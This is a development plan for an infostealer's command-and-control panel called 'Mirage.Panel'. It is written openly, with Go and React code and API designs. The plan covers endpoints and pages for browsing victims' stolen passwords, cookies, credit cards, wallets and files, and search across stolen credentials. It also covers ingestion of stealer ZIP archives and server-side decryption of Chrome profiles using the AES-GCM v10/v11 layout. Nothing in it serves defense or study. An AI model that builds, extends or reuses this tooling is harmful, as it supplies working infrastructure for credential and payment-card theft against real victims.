# Phases 2-4: Sessions, Search & Log Ingestion — Execution Plan

**Цель:** Полноценное управление сессиями, полнотекстовый поиск, приём логов от стилера.  
**Оценка:** 7 дней (Phase 2: 3d + Phase 3: 1d + Phase 4: 3d)  
**Версии:** Go 1.25.6, TanStack Table v9, Recharts 3.3.0, gorilla/websocket v1.5.3  
**Подготовлено:** 2026-07-02 | **Статус:** ⬜ Not started

**Зависимости от Phase 0-1:** ✅ Backend + Auth + Dashboard + WebSocket hub — готово

---

## Phase 2: Sessions & Data (Sprint 2, ~3 дня)

### Исследование (Research)

- **TanStack Table v9 (React):** Новое API — `tableFeatures()`, `useTable()`, `createColumnHelper<typeof features, T>()`. Server-side pagination/sorting/filtering — `manualPagination`, `manualSorting`, `manualFiltering`. Column visibility и pinning остаются клиентскими.
- **Go SQL pagination:** `SELECT ... LIMIT ? OFFSET ?` с параметрами. Сортировка — `ORDER BY ? ?` с whitelist колонок (защита от SQL injection). Фильтры — динамические WHERE с валидацией.
- **Chi router:** `r.Get("/api/sessions", handler.List)` + `r.Get("/api/sessions/{id}", handler.Detail)`

---

#### Day 1: API Handlers (Sessions)

**1.1 `internal/api/sessions.go`** + `internal/api/sessions_test.go` (TDD)

```go
type SessionsHandler struct {
    db *sql.DB
}

func NewSessionsHandler(db *sql.DB) *SessionsHandler

// GET /api/sessions — paginated list with filters
func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request)

// GET /api/sessions/{id} — full detail with all related data
func (h *SessionsHandler) Detail(w http.ResponseWriter, r *http.Request)

// DELETE /api/sessions/{id} — cascade delete
func (h *SessionsHandler) Delete(w http.ResponseWriter, r *http.Request)
```

**List endpoint — query params:**

| Param | Type | Default | Description |
|-------|------|---------|-------------|
| `page` | int | 1 | Page number (1-based) |
| `limit` | int | 50 | Per page (max 100) |
| `sort` | string | `-created_at` | Sort: `+field` asc, `-field` desc |
| `country` | string | — | Filter by country code |
| `os` | string | — | Filter by OS (LIKE) |
| `hwid` | string | — | Filter by HWID |
| `q` | string | — | Search across IP, HWID, OS, username |

**Query building (secure):**
```go
// Whitelist allowed sort columns
var allowedSorts = map[string]string{
    "created_at": "s.created_at",
    "os":         "s.os",
    "ip":         "s.ip",
    "country":    "s.country_code",
}

// Build WHERE clause dynamically with parameterized queries
func (h *SessionsHandler) buildListQuery(r *http.Request) (string, []any, error) {
    var conditions []string
    var args []any

    if c := r.URL.Query().Get("country"); c != "" {
        conditions = append(conditions, "s.country_code = ?")
        args = append(args, c)
    }
    // ... etc
}
```

**Response format:**
```json
{
    "items": [
        {
            "id": "a1b2c3d4",
            "hwid": "ABC123...",
            "os": "Windows 11 Pro",
            "username": "john",
            "ip": "85.26.134.55",
            "country_code": "RU",
            "passwords_count": 12,
            "cookies_count": 45,
            "cards_count": 2,
            "wallets_count": 1,
            "files_count": 3,
            "created_at": "2026-07-02T14:30:00Z"
        }
    ],
    "total": 1284,
    "page": 1,
    "limit": 50,
    "pages": 26
}
```

**Detail endpoint:** Returns session + all related entities with a single query per table (N+1 safe):
```json
{
    "id": "a1b2c3d4",
    "hwid": "ABC123...",
    "os": "Windows 11 Pro",
    "username": "john",
    "ip": "85.26.134.55",
    "country_code": "RU",
    "created_at": "2026-07-02T14:30:00Z",
    "system_info": { "cpu": "...", "gpu": "...", ... },
    "passwords": [ { "id": "p1", "url": "...", "username": "...", "password_value": "...", "browser": "Chrome" } ],
    "cookies": [ { "id": "c1", "domain": ".google.com", "name": "session", "value": "abc", "path": "/" } ],
    "cards": [ { "id": "cc1", "number": "4111••••1111", "exp_month": "12", "exp_year": "28", "holder": "John Doe" } ],
    "wallets": [ { "id": "w1", "name": "MetaMask", "path": "..." } ],
    "files": [ { "id": "f1", "filename": "passwords.txt", "size": 12453 } ]
}
```

**Delete endpoint:** `DELETE FROM sessions WHERE id = ?` — каскадное удаление через `ON DELETE CASCADE` в SQLite.

**1.2 `internal/api/router.go` — Add routes:**
```go
r.Get("/api/sessions", sessionsHandler.List)
r.Get("/api/sessions/{id}", sessionsHandler.Detail)
r.Delete("/api/sessions/{id}", sessionsHandler.Delete)
```

**1.3 Tests:**
- TestList_EmptyDB — пустая БД, 0 результатов
- TestList_WithData — вставка 3 сессий, проверка пагинации
- TestList_FilterByCountry — фильтр по стране
- TestList_FilterBySearch — full-text search по IP/HWID
- TestList_SortByCreated — сортировка ASC/DESC
- TestList_Pagination — page/limit работают
- TestDetail_Existing — полные данные сессии
- TestDetail_NotFound — 404
- TestDelete_Cascade — удаление сессии удаляет пароли

---

#### Day 2: Frontend — Sessions List

**2.1 `src/pages/Sessions.tsx`** — Full implementation

```
┌────────────────────────────────────────────────────────────┐
│  Sessions                              [🔍 Filter...]     │
│                                                             │
│  ┌─────┬─────────────┬─────────┬──────────┬──────────────┐  │
│  │  #  │     IP       │ Country │    OS    │ Passwords    │  │
│  ├─────┼─────────────┼─────────┼──────────┼──────────────┤  │
│  │  1  │ 85.26.134.55│  🇷🇺 RU  │ Win11    │     12       │  │
│  │  2  │ 192.168.1.10│  🇺🇸 US  │ Win10    │      5       │  │
│  │  3  │ 10.0.0.15   │  🇩🇪 DE  │ Win11    │     34       │  │
│  └─────┴─────────────┴─────────┴──────────┴──────────────┘  │
│  « 1 2 3 … 26 »  Rows: 50 ▾                                 │
└────────────────────────────────────────────────────────────┘
```

**Columns:**
- `#` — row number (not data)
- `IP` — monospace font
- `Country` — FlagIcon + country code
- `OS` — OS name
- `Username` — username
- `HWID` — truncated with copy button
- `Passwords / Cookies / Cards / Wallets` — counts
- `Created` — relative time (date-fns formatDistanceToNow)
- `Actions` — delete button (with confirm dialog)

**Data flow:**
```tsx
const paginationAtom = useCreateAtom<PaginationState>({ pageIndex: 0, pageSize: 50 })
const sortingAtom = useCreateAtom<SortingState>([{ id: 'created_at', desc: true }])

const pagination = useSelector(paginationAtom)
const sorting = useSelector(sortingAtom)

const query = useQuery({
    queryKey: ['sessions', { pagination, sorting, search }],
    queryFn: () => api.get<PaginatedResponse<Session>>('/api/sessions', { params: { page: pagination.pageIndex + 1, limit: pagination.pageSize, ... } }),
    placeholderData: keepPreviousData,
})

const table = useTable({
    features: tableFeatures({ rowPaginationFeature, rowSortingFeature }),
    columns,
    data: query.data?.items ?? [],
    rowCount: query.data?.total,
    atoms: { pagination: paginationAtom, sorting: sortingAtom },
    manualPagination: true,
    manualSorting: true,
})
```

**Components from shadcn:**
- Need to add: `npx shadcn@latest add dropdown-menu dialog popover`

**2.2 `src/components/sessions/filter-bar.tsx`**
- Search input (debounced, 300ms)
- Country dropdown filter
- Date range filter (optional)

**2.3 `src/components/sessions/session-row.tsx`**
- Row actions: delete with confirmation (shadcn AlertDialog)
- Country: FlagIcon component

---

#### Day 3: Frontend — Session Detail

**3.1 `src/pages/SessionDetail.tsx`**

```
┌──────────────────────────────────────────────────────────────┐
│  ← Sessions  /  85.26.134.55  🇷🇺 RU                         │
│  HWID: ABC123...  |  Win11 Pro  |  john                      │
├────────┬────────┬────────┬────────┬──────────┬──────────────┤
│Passw.  │Cookies │ Cards  │Wallets │  Files    │  System Info │
├────────┴────────┴────────┴────────┴──────────┴──────────────┤
│ URL                 │ Username          │ Password    │ Br  │
│ ────────────────────┼───────────────────┼─────────────┼─────┤
│ google.com          │ john@gmail.com    │ •••••••••   │ Chr │
│ facebook.com        │ john              │ •••••••••   │ Chr │
│ github.com          │ john              │ •••••••••   │ Edg │
├─────────────────────┴───────────────────┴─────────────┴─────┤
│ Password reveal: 👁 toggle                                    │
│ Per-row: locked/unlocked icon                                 │
└──────────────────────────────────────────────────────────────┘
```

**Tabs (shadcn Tabs component):**
- `npx shadcn@latest add tabs`

**Password reveal:** toggle button per row — changes `password_value` between `•••••••` and plaintext.

**System Info tab:** key-value grid:
```
CPU         Intel Core i7-13700K
GPU         NVIDIA RTX 4080
RAM         32 GB
OS          Windows 11 Pro 23H2
Screen      2560x1440
Hostname    DESKTOP-ABC123
Local IP    192.168.1.100
MAC         00:1A:2B:3C:4D:5E
Public IP   85.26.134.55
Uptime      3h 12m
```

**Cards tab:** masked number `4111••••1111`, CVC always hidden (`•••`).

**3.2 Add shadcn components:**
```bash
npx shadcn@latest add tabs dropdown-menu dialog alert-dialog
```

**3.3 Tests:**
- `go test ./internal/api/...` — session handlers
- `npx tsc --noEmit` — TypeScript

---

## Phase 3: Search (Sprint 3, ~1 день)

### Исследование (Research)

- **SQLite FTS5** — мощный full-text search, но требует создания virtual table. Для простоты используем `LIKE %...%` с индексами. Для больших объёмов (>100k записей) потом перейдём на FTS5.
- **Индексы:** `idx_passwords_url`, `idx_passwords_session` уже есть. Добавим составные индексы для поиска.
- **Поиск** делаем через UNION ALL по трём таблицам (passwords, cookies, cards).

---

**1.1 `internal/api/search.go`** + `internal/api/search_test.go` (TDD)

```go
type SearchHandler struct {
    db *sql.DB
}

func NewSearchHandler(db *sql.DB) *SearchHandler

// GET /api/search
// Params: q (required, min 2 chars), type (passwords|cookies|cards|all), page, limit
func (h *SearchHandler) Search(w http.ResponseWriter, r *http.Request)
```

**Response:**
```json
{
    "results": [
        {
            "type": "password",
            "session_id": "a1b2c3...",
            "url": "https://facebook.com",
            "username": "john@gmail.com",
            "password_value": "secret123",
            "browser": "Chrome",
            "matched_field": "url"
        },
        {
            "type": "cookie",
            "session_id": "a1b2c3...",
            "domain": ".google.com",
            "name": "session_id",
            "value": "abc...",
            "matched_field": "domain"
        }
    ],
    "total": 452,
    "page": 1,
    "limit": 50
}
```

**SQL для поиска по паролям:**
```sql
SELECT 'password' as type, session_id, url, username, password_value, browser,
       CASE
           WHEN url LIKE ? THEN 'url'
           WHEN username LIKE ? THEN 'username'
           WHEN password_value LIKE ? THEN 'password_value'
       END as matched_field
FROM passwords
WHERE url LIKE ? OR username LIKE ? OR password_value LIKE ?
LIMIT ? OFFSET ?
```

**1.2 `internal/api/router.go` — Add route:**
```go
r.Get("/api/search", searchHandler.Search)
```

**1.3 `src/pages/Search.tsx`** — Full implementation

```
┌──────────────────────────────────────────────────────────────┐
│  Search                                                      │
│  [🔍_________________________________]  Search  [All ▾]      │
│                                                               │
│  ┌──────────┬─────────────────────┬───────────┬────────────┐  │
│  │ Type     │ URL / Domain        │ Username  │ Value      │  │
│  ├──────────┼─────────────────────┼───────────┼────────────┤  │
│  │ 🔑 pw    │ google.com          │ john      │ •••••••    │  │
│  │ 🔑 pw    │ yahoo.com           │ john      │ •••••••    │  │
│  │ 🍪 ck    │ .facebook.com       │ —         │ session=abc│  │
│  │ 💳 cc    │ stripe.com          │ John Doe  │ 4111••••   │  │
│  └──────────┴─────────────────────┴───────────┴────────────┘  │
│                                                               │
│  Results: 452 in 0.3s  « 1 2 3 … 10 »                        │
└──────────────────────────────────────────────────────────────┘
```

- Debounced search (300ms) with URL query params (shareable)
- Type filter: All / Passwords / Cookies / Cards
- Keyboard shortcut: `/` focuses search
- Click row → navigate to SessionDetail
- Highlight matched fields (yellow background)
- Show search time and result count

**1.4 Tests:**
- TestSearch_PasswordMatch — поиск по URL/username/password
- TestSearch_CookieMatch — поиск по domain/name
- TestSearch_CardMatch — поиск по holder/number
- TestSearch_ShortQuery — min 2 chars
- TestSearch_NoResults — пустой результат
- TestSearch_Pagination — пагинация
- TestSearch_TypeFilter — фильтр по типу

---

## Phase 4: Log Ingestion (Sprint 4, ~3 дня)

### Исследование (Research)

- **Go multipart:** `r.ParseMultipartForm(10 << 20)` — стандартный парсер. `r.FormFile("archive")` — получение файла.
- **ZIP парсинг:** `archive/zip` — стандартная библиотека Go. `zip.NewReader()` читает ZIP.
- **Path traversal:** Проверять `filepath.Clean(entry.Name)` не начинается с `..` и не содержит `..` после clean.
- **WebSocket broadcast:** После успешной обработки лога — `hub.Broadcast(ws.NewSessionEvent(...))`.

---

#### Day 1: POST /api/log base

**1.1 `internal/services/log_processor.go`** — бизнес-логика обработки

```go
type LogProcessor struct {
    db  *sql.DB
    hub *ws.Hub   // nil = no broadcast
}

func NewLogProcessor(db *sql.DB, hub *ws.Hub) *LogProcessor

// Process parses a ZIP archive from the stealer and inserts into DB.
// Returns the created session ID or error.
func (p *LogProcessor) Process(archive []byte, metadataJSON string) (string, error)
```

**Flow:**
1. Parse metadata JSON → extract hwid, os, username, ip, country
2. Open ZIP via `zip.NewReader(bytes.NewReader(archive))`
3. For each entry:
   - Validate path (reject `..`, absolute paths)
   - Categorize by filename pattern:
     - `*passwords*.txt` → ParsePasswords (tab-delimited)
     - `*cookies*.txt` → ParseCookies
     - `*credit_cards*.txt` / `*cards*.txt` → ParseCards
     - `system_info.txt` → entire file as system info
     - `wallets/*` → wallet name from path
     - `gaming/*`, `messengers/*` → skip (logged but not stored in DB yet)
4. Begin transaction:
   - INSERT INTO sessions
   - INSERT INTO passwords (batch insert)
   - INSERT INTO cookies
   - INSERT INTO cards
   - INSERT INTO wallets
   - INSERT INTO stolen_files
   - INSERT INTO system_info
5. Commit
6. Broadcast `new_session` event via WebSocket hub
7. Save raw ZIP to `/data/logs/` directory
8. Return session ID

**Path traversal protection:**
```go
func isValidPath(name string) bool {
    clean := filepath.Clean(name)
    if strings.HasPrefix(clean, "..") || filepath.IsAbs(clean) {
        return false
    }
    return true
}
```

**1.2 `internal/api/logs.go`** — HTTP handlers

```go
type LogsHandler struct {
    processor *LogProcessor
}

func NewLogsHandler(processor *LogProcessor) *LogsHandler

// POST /api/log — single archive upload
func (h *LogsHandler) Ingest(w http.ResponseWriter, r *http.Request)

// POST /api/log/chunk — chunked upload, single chunk
func (h *LogsHandler) Chunk(w http.ResponseWriter, r *http.Request)

// POST /api/log/complete — finalize chunked upload
func (h *LogsHandler) CompleteChunked(w http.ResponseWriter, r *http.Request)
```

**Ingest handler:**
```go
func (h *LogsHandler) Ingest(w http.ResponseWriter, r *http.Request) {
    // 1. Limit body size to 100 MB
    r.Body = http.MaxBytesReader(w, r.Body, 100<<20)

    // 2. Parse multipart form (10 MB memory limit)
    if err := r.ParseMultipartForm(10 << 20); err != nil {
        writeError(w, http.StatusBadRequest, "invalid form data")
        return
    }

    // 3. Get archive file
    archiveFile, _, err := r.FormFile("archive")
    if err != nil {
        writeError(w, http.StatusBadRequest, "archive file required")
        return
    }
    defer archiveFile.Close()

    archiveBytes, err := io.ReadAll(archiveFile)
    if err != nil {
        writeError(w, http.StatusInternalServerError, "failed to read archive")
        return
    }

    metadata := r.FormValue("metadata")

    // 4. Process
    sessionID, err := h.processor.Process(archiveBytes, metadata)
    if err != nil {
        writeError(w, http.StatusInternalServerError, "processing failed")
        return
    }

    writeJSON(w, http.StatusOK, map[string]string{"session_id": sessionID})
}
```

**Chunked upload — in-memory storage (like old Panel):**
```go
type ChunkSession struct {
    ID        string
    Chunks    [][]byte
    Total     int
    CreatedAt time.Time
}

var (
    chunkMu  sync.RWMutex
    chunks   = make(map[string]*ChunkSession)
    chunkTTL = 1 * time.Hour
)

func init() {
    // Cleanup goroutine every 5 minutes
    go func() {
        for {
            time.Sleep(5 * time.Minute)
            chunkMu.Lock()
            for id, cs := range chunks {
                if time.Since(cs.CreatedAt) > chunkTTL {
                    delete(chunks, id)
                }
            }
            chunkMu.Unlock()
        }
    }()
}
```

**1.3 `internal/api/router.go` — Add routes:**
```go
r.Post("/api/log", logsHandler.Ingest)
r.Post("/api/log/chunk", logsHandler.Chunk)
r.Post("/api/log/complete", logsHandler.CompleteChunked)
```

**1.4 Tests:**
- TestIngest_ValidArchive — ZIP с паролями → 200 + session_id
- TestIngest_EmptyArchive — пустой ZIP → ошибка
- TestIngest_PathTraversal — entry с `../` → rejected
- TestIngest_TooLarge — >100 MB → 413
- TestIngest_MissingArchive — без файла → 400
- TestChunk_Complete — 3 чанка + complete → 200
- TestChunk_Incomplete — 1 чанк, без complete → ничего не сохранено

---

#### Day 2: Server-Side Processing (SSP)

**2.1 `internal/services/server_side_decrypt.go`**

```go
// ProcessBrowserProfile extracts and decrypts a raw browser profile archive.
// Accepts a ZIP containing Login Data, Cookies, Web Data, History, master_key.bin.
func (s *SSPService) ProcessBrowserProfile(profile []byte) (*SSPResult, error)

type SSPResult struct {
    Passwords []Password
    Cookies   []Cookie
    Cards     []Card
    History   []HistoryEntry
}
```

**Flow:**
1. Extract `master_key.bin` from ZIP root
2. For each browser profile directory:
   - Open `Login Data` SQLite → decrypt AES-GCM fields
   - Open `Cookies` SQLite → extract cookies
   - Open `Web Data` → extract credit cards
3. AES-GCM decrypt (v10/v11 format):
   - Bytes 0-2: `"v10"` or `"v11"`
   - Bytes 3-14: 12-byte nonce
   - Bytes 15 to end-16: ciphertext
   - Last 16 bytes: tag
4. Store all in DB via LogProcessor

**2.2 `internal/api/ssp.go`**
```go
// POST /api/log/ssp — raw browser profile archive
func (h *SSPHandler) ProcessSSP(w http.ResponseWriter, r *http.Request)
```

**2.3 Tests:**
- TestSSP_ChromeDecrypt — mock encrypted blob → decrypt
- TestSSP_InvalidMasterKey → error
- TestSSP_NoLoginData → empty result, no error

---

#### Day 3: Integration & Broadcast

**3.1 WebSocket broadcast integration**

В `LogProcessor.Process()`, после успешного commit:
```go
if p.hub != nil {
    // Count passwords/cookies for this session
    event := ws.NewSessionEvent(ws.NewSessionPayload{
        ID:             sessionID,
        CountryCode:    countryCode,
        PasswordsCount: passwordCount,
    })
    p.hub.Broadcast(event)
}
```

**3.2 Payload size limit middleware**

```go
// MaxBodySize returns middleware that limits request body size.
func MaxBodySize(maxBytes int64) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            r.Body = http.MaxBytesReader(w, r.Body, maxBytes)
            next.ServeHTTP(w, r)
        })
    }
}
```

**3.3 Raw ZIP storage**

```go
func saveRawArchive(data []byte) error {
    logsDir := filepath.Join("data", "logs")
    os.MkdirAll(logsDir, 0755)
    ts := time.Now().UTC().Format("20060102_150405")
    filename := filepath.Join(logsDir, fmt.Sprintf("log_%s_%s.zip", ts, uuid.New().String()[:8]))
    return os.WriteFile(filename, data, 0644)
}
```

**3.4 Integration test**

```bash
# Terminal 1: Start backend
cd Mirage.Panel && go run ./cmd/panel &

# Terminal 2: Send test log
python3 -c "
import requests, zipfile, io

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('Browser Data/Chrome_passwords.txt', 'example.com\tuser\tpass123\n')
    z.writestr('system_info.txt', 'OS: Windows 11\nCPU: Intel i7\n')
buf.seek(0)

r = requests.post(
    'http://127.0.0.1:8080/api/log',
    files={'archive': ('test.zip', buf, 'application/zip')},
    data={'metadata': '{\"hwid\":\"TEST\",\"os\":\"Win11\",\"username\":\"tester\",\"ip\":\"1.2.3.4\"}'},
    headers={'Authorization': 'Bearer <token>'})
print(r.status_code, r.json())
"

# Verify
sqlite3 data/mirage.db "SELECT COUNT(*) FROM sessions;"
sqlite3 data/mirage.db "SELECT url, username, password_value FROM passwords;"
```

**3.5 Production build**

```bash
cd web && npm run build
rm -rf ../cmd/panel/frontend/dist && cp -r dist ../cmd/panel/frontend/dist
cd .. && go build -o bin/mirage-panel ./cmd/panel
```

---

## Deliverables Summary

### Phase 2: Sessions & Data
- ✅ `GET /api/sessions` — пагинация, сортировка, фильтрация
- ✅ `GET /api/sessions/{id}` — полный детал со всеми данными
- ✅ `DELETE /api/sessions/{id}` — каскадное удаление
- ✅ SessionsPage — TanStack Table v9 (server-side sort/paginate/filter)
- ✅ SessionDetailPage — Tabbed view (Passwords, Cookies, Cards, Wallets, Files, SysInfo)
- ✅ Password reveal toggle
- ✅ Country flag badges (FlagIcon)
- ✅ Delete confirmation dialog

### Phase 3: Search
- ✅ `GET /api/search` — full-text across passwords, cookies, cards
- ✅ SearchPage — debounced input, type filter, results table
- ✅ Highlight matched fields
- ✅ Click result → SessionDetail
- ✅ Keyboard shortcut `/` to focus search

### Phase 4: Log Ingestion
- ✅ `POST /api/log` — multipart ZIP + metadata
- ✅ `POST /api/log/chunk` + `/api/log/complete` — chunked upload
- ✅ LogProcessor — ZIP parse + DB insert (transaction)
- ✅ Path traversal protection (sanitize ZIP entry names)
- ✅ Raw ZIP saving to `/data/logs/`
- ✅ WebSocket broadcast on new log (`new_session` event)
- ✅ Payload size limit middleware (100 MB)
- ✅ ServerSideDecrypt (SSP) — Chrome AES-GCM + Gecko NSS

---

## Files to create/modify

| Файл | Phase | Действие |
|------|-------|----------|
| `internal/api/sessions.go` | 2 | 🆕 Sessions handler (List, Detail, Delete) |
| `internal/api/sessions_test.go` | 2 | 🆕 Tests |
| `internal/api/search.go` | 3 | 🆕 Search handler |
| `internal/api/search_test.go` | 3 | 🆕 Tests |
| `internal/api/logs.go` | 4 | 🆕 Log Ingest + Chunk + Complete |
| `internal/api/logs_test.go` | 4 | 🆕 Tests |
| `internal/api/ssp.go` | 4 | 🆕 ServerSideDecrypt endpoint |
| `internal/api/ssp_test.go` | 4 | 🆕 Tests |
| `internal/services/log_processor.go` | 4 | 🆕 ZIP parser + DB inserter |
| `internal/services/log_processor_test.go` | 4 | 🆕 Tests |
| `internal/services/server_side_decrypt.go` | 4 | 🆕 Browser profile decrypt |
| `internal/middleware/size.go` | 4 | 🆕 Max body size middleware |
| `internal/api/router.go` | 2-4 | ✏️ Add new routes |
| `cmd/panel/main.go` | 4 | ✏️ Wire LogProcessor + SSP |
| `web/src/pages/Sessions.tsx` | 2 | 🆕 Sessions list with TanStack Table |
| `web/src/pages/SessionDetail.tsx` | 2 | 🆕 Tabbed session detail |
| `web/src/pages/Search.tsx` | 3 | 🆕 Full-text search page |
| `web/src/services/api.ts` | 2-4 | ✏️ Add new API methods |
